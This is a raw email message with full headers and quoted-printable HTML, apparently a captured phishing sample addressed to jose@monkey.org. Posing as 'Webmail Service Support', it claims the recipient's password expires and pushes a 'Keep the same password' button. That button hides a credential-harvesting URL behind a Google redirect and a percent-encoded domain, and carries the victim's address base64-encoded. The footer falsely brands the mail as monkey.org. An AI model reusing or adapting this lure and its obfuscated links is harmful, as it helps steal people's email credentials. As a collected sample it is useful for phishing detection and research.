@@ -1,0 +1,160 @@
+Return-Path: admin@varsteel.info
+Delivered-To: jose@monkey.org
+X-FDA: 83481372156.19.C9C08A5
+Received: from mail.varsteel.info (unknown [91.188.254.118])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id C4178120006
+	for <jose@monkey.org>; Sun, 25 May 2025 12:33:56 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;
+	dkim=pass header.d=varsteel.info header.s=dkim header.b=oChKpjL2;
+	spf=pass (imf18.b.hostedemail.com: domain of admin@varsteel.info designates 91.188.254.118 as permitted sender) smtp.mailfrom=admin@varsteel.info;
+	dmarc=pass (policy=quarantine) header.from=varsteel.info
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1748176437;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=zstKAvJv9DVu5qSdSZBfxDDPRqC/Xc5gIG5StpHgVBc=;
+	b=GsGs+UB443IMifq4UZ3/Hn6iGkDREDJgrz6RiMkkJdujBLt0D3/MmnHJeuZzT3XanYFWLg
+	MVlKplojfK8dmx44YZrjrmBJ2S8X9JkYB9q34viffknARlsu7Whh/6n0vZsVWc4rSV6tGt
+	O21JUK2+XAf9Mk1JFEDMNSl9Xq6PhXU=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1748176437; a=rsa-sha256;
+	cv=none;
+	b=rC1mXCNNQYJiZtdlDCdHbcf+XKSFCKbVL16yTvLOsYAGJ44HlG+hrWMjz24IhKDtvfOVMM
+	d+4w20wpYpDlPl85rbL4WwqFgux+1NDQUvMMzlTSg+xF++I3sdBKJreCsorETUhBB3sPkT
+	xwk+T42kixVY3aEyeShYh7BFP5e6C78=
+ARC-Authentication-Results: i=1;
+	imf18.b.hostedemail.com;
+	dkim=pass header.d=varsteel.info header.s=dkim header.b=oChKpjL2;
+	spf=pass (imf18.b.hostedemail.com: domain of admin@varsteel.info designates 91.188.254.118 as permitted sender) smtp.mailfrom=admin@varsteel.info;
+	dmarc=pass (policy=quarantine) header.from=varsteel.info
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=varsteel.info;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=admin@varsteel.info;
+ bh=zstKAvJv9DVu5qSdSZBfxDDPRqC/Xc5gIG5StpHgVBc=;
+ b=oChKpjL2fHK4o64Fdsn1IplQesRvgiptCe3AN68tpbEza1ZGGiUvozLGgvE4HRALPCmGYq8mjiZQ
+   y+S3oAp4UonhU7+fuGuKVmxkSAEgT8z3qc0K0roT4se37xw9sAJF5azwALfaqANHDHplNvn6dmRZ
+   eifeapJ15n2jLJZWwsWu+AN65pTSoH5lAmhEHdNsexYq8fts4zuSzb/HveXVfhAy87rz02pWGzbK
+   qSJKzgap/Ki41JXqGKjVrGmCPHxPBONwJSdeW75PnzjoBm7IcJsB8+VszOquQUAtSmUhuAjSSmRt
+   bN9ksxkxkeQasQVu3gX8AaTBd5M6H6VYGg9u/Q==
+From: =?UTF-8?B?V2VibWFpbCBTZXJ2aWNlIFN1cHBvcnQ=?=<admin@varsteel.info>
+To: jose@monkey.org
+Subject: =?UTF-8?B?RmluYWwgcmVtaW5kZXI6IFlvdXIgUGFzc3dvcmQgUmVxdWlyZXMgVXBkYXRl?= jose@monkey.org
+Date: 25 May 2025 05:33:54 -0700
+Message-ID: <20250525053354.D9D51D78BFF3F99A@varsteel.info>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: C4178120006
+X-Stat-Signature: pbwijj8dkku16mkos3bgiwewdwz1dj13
+X-Rspam-User: 
+X-Spam-Status: No, score=4.21
+X-HE-Tag: 1748176436-75474
+X-HE-Meta: U2FsdGVkX18grGzynySN7q97Q9dStdnwa7EqRfS1+TPysjFrSqrgMmxAGkzeVYq5KXc3HU032O5EOdT0U51rqNpqKjeuBc6qS5AOfBvay7QxvjM+wfO7HAUAqLvyUy9TJzcqiSjInlndWi8ovUJF0086DXTkY2BeZrJvs4CyB0zF1qFwg94KtEdRj9cY3VI2g1yH51y77u8bs65Z09ni4B6wJGcgHeM4q8SlptvHzo7HLUpa8YyX70T8AN4gxQByVIn9VtkK0xK9Fj7RiFBllyOlSGoUNO2dwIbhpxBeE1JMsDQPS8L5Yy3erspwakd03Adt0gWi4O5vqggoEdtkpidnw2fzNq2sStLEGjRG47r+WsaDm8uAnjczbkHgW7qBKkVWn7arbEKA+VVqZN/cIwiJM1WYWyCVzGaINcEQi1CnA+vFKcxePe0eqOg2AxEK6yQlJ0BABxk3Xt1VTjnCTKPzSLlWPDM9wJ2Y6wpuVTpt95SJ5IdSMIf3tg2fJYbu8aGJz2GYi3hjIrpAbtnU+kWoEPcYJGkZuct33JJ/2S7u977vgEbFwTtM0UMDukF/H1dI1zCfWj1/Pb19RhabV6FsJLus+09nSEat1BYWJWmlG1y9gVCVbHQTO9ZVV6l2kTyMFo0APAB+y6ukHOXDKeySemPM+YCx9eCJ0iQzNdKRH26JbhvhrrzqgBcqUK/+Hwtd8sD8I9UE9IVrdouD3rcY4JU8Z4FbFBS52mbMvqWImfibuXLkrH6/838cYnDvdwhWtkVT7SVmJOe8pryViUzqnme/oyLAio/meg7s1FV25HLDhNdVaPR/dvohvKbDFDRtbt1CWIF3v7ajfvnNeVhUvSuJSnpk9931COluBeNu60GFQitzZ+eA6/2Ghjb2IBOqaS4eVAWBxujmFfr4aY/xh/5jFN2AvWNESViTts3V8qX/NaZNjivdo2nqNGQ4Y8qBDcvQGOgREt+7xU6Gc9PqQ2m
+ lIw47eophop8V74P7ybSKI2lsHtWsBB8maXF9uIVJZAZpqAF0LybZ4AFVDTeLDNKgTOSI4AJflapgQce+yZEP5zZ6JWmbEZRip5VlogdjvB49YYn4ftRSm9JeR8LDWRpUjQrrXx0wFQGYtg0jrTqgMHDDOuk9c/yiwJ05Mj4rQ7s1dQ+fWYWIEMJMEdygTXuGOqU5snUWgLvoUOtgi6A45fU3Rljl9HoZXqYQt3oDP7fMzzEloyRaep8Gc0A+u8sz+3k2/4NMvoAoNEtxsTfXUSYd+d5ZbLJACiDx2Kp0X2N/VF362RlMx7hKz4kGwpx7XsPJ9+Zhb/0ypBEy8utyXV4t7cMY35i5XIqjwk5Csz/ZPQSpmmaKwVCqc2NCTrZDUJ4FsI0s+qtacj0CrCyPtr7wy2agtcwQEdr/UTkdIUMmgyHEOdCMMILQiNn32M/1v/FC0R2o82Zh0CGM1h1v6aunblDQ/Du+OQIqiJ7gE1SrWi8d2QdogzLvtKfEUoFEWZeSRI3U3jiM1InmotbQyJE6dqIQSlcvT21HilTupjXlbURGdtCecVD9plBIm5P9tJMo2v4Ep1KN6hFrDUEWRqZgkhUtOPQ/pmn8IUigNePDwGKRhSTV4vinImOMT3BqlN2WZly7waP7rI6XxNzrBOmdsNiJW4ZXxShA8a3B8r7bk/gFGXEL5dJ1LIsHffZrDbTogMDl6P12FwZoQbcOJHYb1RsAyyepdSRg4Y9UPX+7rGJV9nRDy6dfZYiG5ar8Ley5GHQwxQVKTPotNrCZl9iUinn/vUI1cMWPdPKlZyWTkpw9hM8VBtBgOI24hS9MMABBJZW7mZssLNsl95KGfpg/h2ESUZ13ZIAcQf9MUP82OPXdnIv02p3/FcC+e8WDXEOSxj5hCGB/j7k0oB3ZjDLi8Y7i3BYepaC+/Pbo6IKa3ryAYllHv5HRTg==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 229
+
+<HTML><HEAD><TITLE>Can&#8217;t reach this page</TITLE><LINK rel=3Dstyleshee=
+t type=3Dtext/css href=3D"NewErrorPageTemplate.css">
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
+<SCRIPT language=3Djavascript type=3Dtext/javascript src=3D"errorPageString=
+s.js">
+        </SCRIPT>
+
+<SCRIPT language=3Djavascript type=3Dtext/javascript src=3D"httpErrorPagesS=
+cripts.js">
+        </SCRIPT>
+
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001">
+<META content=3DIE=3Dedge http-equiv=3DX-UA-Compatible></HEAD>
+<BODY onload=3Djavascript:getInfo();>
+<H1 style=3D"BOX-SIZING: border-box; FONT-SIZE: 28px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 500; COLOR: rgb(238,97,17); FONT-STYLE: normal=
+; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-H=
+EIGHT: 1.2; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial">Webmail</H1=
+>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-BOTTOM: 15px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MAR=
+GIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36);=
+ FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial">Dear&nbsp;<=
+A style=3D"BOX-SIZING: border-box; COLOR: rgb(255,108,44); BACKGROUND-COLOR=
+: transparent">jose</A>,</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-BOTTOM: 15px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MAR=
+GIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36);=
+ FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial">Your passwo=
+rd expires on&nbsp;<SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(255,10=
+8,44)">5/25/2025 5:33:54 a.m..</SPAN>&nbsp;(Action Required) You must take =
+immediate steps to maintain and avoid restricting access to your&nbsp;<A st=
+yle=3D"BOX-SIZING: border-box; COLOR: rgb(255,108,44); BACKGROUND-COLOR: tr=
+ansparent">jose@monkey.org</A>&nbsp;account.</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-BOTTOM: 15px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MAR=
+GIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36);=
+ FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial">
+<A style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold; COLOR: rgb(255,255,2=
+55); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 20px; DISPLAY: =
+inline-block; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(227,96,9); text-de=
+coration-line: none; border-radius: 5px" href=3D"https://www.google.com/url=
+?q=3Dhttps%3A%2F%2Fw%65%62%73%69%74%65%74%72%61%66%66%69c.co.za%2F001%2F&sa=
+=3DD&sntz=3D1&usg=3DAOvVaw02KUVilwCTRevJP2sAxnPz#?0088309007Family=3Dam9zZU=
+Btb25rZXkub3Jn" rel=3Dnoreferrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://fast-nail-bi=
+g.on-fleek.app/%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D17443352=
+50289000&amp;usg=3DAOvVaw2gmgsArW0-onpRmwXCT_Be">Keep the same password</A>=
+</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-BOTTOM: 15px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MAR=
+GIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36);=
+ FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial">Problems fo=
+und in the claim fulfillment system will no longer be investigated or fixed=
+=2E</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-BOTTOM: 15px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MAR=
+GIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36);=
+ FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial">&copy;&nbsp=
+;<A style=3D"BOX-SIZING: border-box; COLOR: rgb(255,108,44); BACKGROUND-COL=
+OR: transparent; text-decoration-line: none" href=3D"http://marwoodconstruc=
+tion.com/" rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https:/=
+/www.google.com/url?q=3Dhttp://marwoodconstruction.com/&amp;source=3Dgmail&=
+amp;ust=3D1744335250289000&amp;usg=3DAOvVaw3_wHqG0KmnmhifqDHkyIVw">monkey.o=
+rg</A>&nbsp;2025</P>
+<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORP=
+HANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,2=
+55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial'>
+<H2 id=3Dm_6519115127847401476m_-6247778941053292989gmail-v1aria-label-mess=
+agebody>&nbsp;</H2></DIV></BODY></HTML>
